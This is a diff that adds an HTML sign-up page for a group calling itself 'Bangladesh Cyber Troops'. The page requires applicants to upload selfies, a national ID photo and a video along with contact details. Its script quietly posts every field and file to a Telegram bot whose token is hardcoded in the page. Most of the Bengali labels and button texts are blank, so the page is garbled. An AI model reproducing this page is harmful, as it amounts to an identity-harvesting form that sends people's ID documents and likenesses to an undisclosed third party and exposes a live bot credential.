@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Bangladesh Cyber Troops - Join Now</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap');
+*{box-sizing:border-box;margin:0;padding:0;font-family:'Poppins',sans-serif;}
+body{background:#000;color:#B9EAFF;}
+.banner{height:400px;display:flex;align-items:center;justify-content:center;background:#0a0a0a;}
+#neonText{font-size:40px;font-weight:700;color:#00ffff;text-shadow:0 0 10px #00ffff;}
+.container{max-width:700px;margin:30px auto;background:#0a0a0a;padding:25px;border-radius:12px;box-shadow:0 0 20px #00ffff;}
+input,textarea,select{width:100%;padding:15px;margin:10px 0;background:#000;color:#B9EAFF;border:2px solid #00ffff;border-radius:8px;}
+label{margin-top:15px;display:block;font-weight:600;}
+.yes-no-buttons{display:flex;justify-content:space-between;}
+.yes-no-buttons button{width:48%;padding:15px;background:white;color:black;font-weight:700;border-radius:10px;border:2px solid #B9EAFF;cursor:pointer;}
+.yes-no-buttons button.active-yes{background:#00ff00;border-color:#00ff00;}
+.yes-no-buttons button.active-no{background:#ff0000;border-color:#ff0000;}
+.submit-btn{width:100%;padding:18px;margin-top:20px;background:linear-gradient(45deg,#B9EAFF,#00ffff);border:none;color:black;font-weight:700;border-radius:12px;cursor:pointer;}
+.footer{text-align:center;margin:30px;font-size:12px;color:#666;}
+.footer a{color:#B9EAFF;}
+</style>
+</head>
+<body>
+
+<div class="banner">
+<span id="neonText">Bangladesh Cyber Troops - Join Now</span>
+</div>
+
+<div class="container">
+<form id="bctForm">
+<input type="text" name="name" placeholder=" " required>
+<input type="tel" name="phone" placeholder="  " required>
+<input type="email" name="email" placeholder=" " required>
+<textarea name="address" placeholder=" " required></textarea>
+
+<label>    </label>
+<input type="file" name="selfie" accept="image/*" multiple required>
+
+<label>NID/  </label>
+<input type="file" name="nid" accept="image/*" required>
+
+<label>-    </label>
+<input type="file" name="video" accept="video/*" required>
+
+<input type="url" name="fb_link" placeholder="  " required>
+
+<label>/  ?</label>
+<div class="yes-no-buttons">
+<button type="button" id="yesBtn"></button>
+<button type="button" id="noBtn"></button>
+</div>
+<input type="hidden" name="experience" id="exp" required>
+
+<button type="submit" class="submit-btn"> </button>
+</form>
+</div>
+
+<div class="footer">
+&copy; 2025 Bangladesh Cyber Troops | Developed by Adnan Hasan Sakib | <a href="mailto:bangladeshcybertroopsbct@gmail.com">Contact</a>
+</div>
+
+<script>
+const token = '7867164207:AAE54hB6XpUmM5SJkGdAoZVsQAK6LFrsJFk';
+const chatId = '6527032149';
+
+yesBtn.onclick = ()=>{document.getElementById('exp').value='';yesBtn.classList.add('active-yes');noBtn.classList.remove('active-no');};
+noBtn.onclick = ()=>{document.getElementById('exp').value='';noBtn.classList.add('active-no');yesBtn.classList.remove('active-yes');};
+
+document.getElementById('bctForm').addEventListener('submit', async function(e){
+    e.preventDefault();
+    const form = e.target;
+    const data = new FormData(form);
+
+    const text = `  \n : ${data.get('name')}\n : ${data.get('phone')}\n : ${data.get('email')}\n : ${data.get('address')}\n : ${data.get('fb_link')}\n : ${data.get('experience')}`;
+    await fetch(`https://api.telegram.org/bot${token}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:chatId,text})});
+
+    for (const file of data.getAll('selfie')){
+        let fd=new FormData();fd.append('chat_id',chatId);fd.append('photo',file);
+        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`,{method:'POST',body:fd});
+    }
+    let fd=new FormData();fd.append('chat_id',chatId);fd.append('photo',data.get('nid'));
+    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`,{method:'POST',body:fd});
+
+    let vf=new FormData();vf.append('chat_id',chatId);vf.append('video',data.get('video'));
+    await fetch(`https://api.telegram.org/bot${token}/sendVideo`,{method:'POST',body:vf});
+
+    alert("          ");
+    form.reset();
+    yesBtn.classList.remove('active-yes');
+    noBtn.classList.remove('active-no');
+});
+</script>
+
+<script>
+const neon=document.getElementById('neonText'),colors=['#00ffff','#00ff00','#ff00ff','#ffff00','#ff0000'];let i=0;
+setInterval(()=>{neon.style.color=colors[i];neon.style.textShadow=`0 0 10px ${colors[i]}`;i=(i+1)%colors.length;},1000);
+</script>
+
+</body>
+</html>
